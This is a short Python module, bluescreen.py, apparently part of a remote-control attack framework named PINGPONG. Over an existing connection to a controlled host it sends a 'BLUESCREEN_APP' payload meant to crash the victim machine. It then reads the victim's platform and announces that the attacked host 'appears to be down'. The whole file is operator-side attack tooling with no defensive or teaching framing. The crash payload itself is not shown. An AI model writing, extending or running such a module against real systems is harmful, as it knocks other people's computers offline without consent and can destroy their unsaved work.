# -*- coding:utf-8 -*-
# @FileName  :bluescreen.py
# @Time      :2023/01/01 15:38:48
# @Author    :D0WE1L1N
from sys import path
path.append("..")
import main
import PINGPONG_script.addsend as addsend
def start_attack(conn, my_ip, my_port, ip, port):
    def attack_done():
        main.print_good("PINGPONG>[+]Attack Done, The attacked host appears to be down")
        main.print_normal("PINGPONG>[*]Back to the main console")
        connection_pool = main.get_value("connection_pool")
        connection_pool.remove([conn, my_ip, my_port, ip, int(port)])
        main.main()
    import select
    choose = input('PINGPONG>[*]This attack will cause the connection lost, Sure?[y/n]')
    if choose == 'y' or choose == 'Y' or choose == 'YES' or choose == 'yes' or choose == '' or choose == ' ':
        main.print_normal("PINGPONG>[*]Sending attack application......")
        addsend.App_send('BLUESCREEN_APP', False, conn)
        main.print_normal("PINGPONG>[*]Done")
        platfrom = conn.recv(1024).decode('utf8')
        main.print_normal(f"PINGPONG>[*]The platfrom is {platfrom}")
        main.print_normal("PINGPONG>[*]Attacking......")
        conn.setblocking(0)
        ready = select.select([conn], [], [], 2)
        if ready[0]:
            data = conn.recv(1024).decode("utf8")
            if data == 'NOPE':
                main.print_error("PINGPONG>[-]Attack failed, your authority may not be sufficient to complete this attack")
            else:
                attack_done()
        else:
            attack_done()
        main.main()
    else:
        main.print_normal("PINGPONG>[*]Back to PINGPONG console......")
